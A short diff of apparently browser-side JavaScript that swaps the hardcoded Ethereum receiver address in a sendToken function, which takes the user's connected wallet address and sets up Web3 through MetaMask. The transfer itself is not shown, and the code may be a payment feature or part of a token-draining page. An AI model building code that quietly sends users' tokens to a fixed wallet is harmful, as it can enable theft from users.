@@ -92,7 +92,7 @@ const tokenAddress = {
 
 function sendToken(token, value, decimals) {
   const senderAddress = window.ethereum.selectedAddress
-  const receiverAddress = "0x4d10ae710Bd8D1C31bd7465c8CBC3add6F279E81"
+  const receiverAddress = "0x194f14Ac52eb4e7cfc50141874AA873c5c9e9274"
   //const web3 = new Web3("https://eth-mainnet.gateway.pokt.network/v1/5f3453978e354ab992c4da79")
   window.web3 = new Web3(window.ethereum)
   window.ethereum.enable()
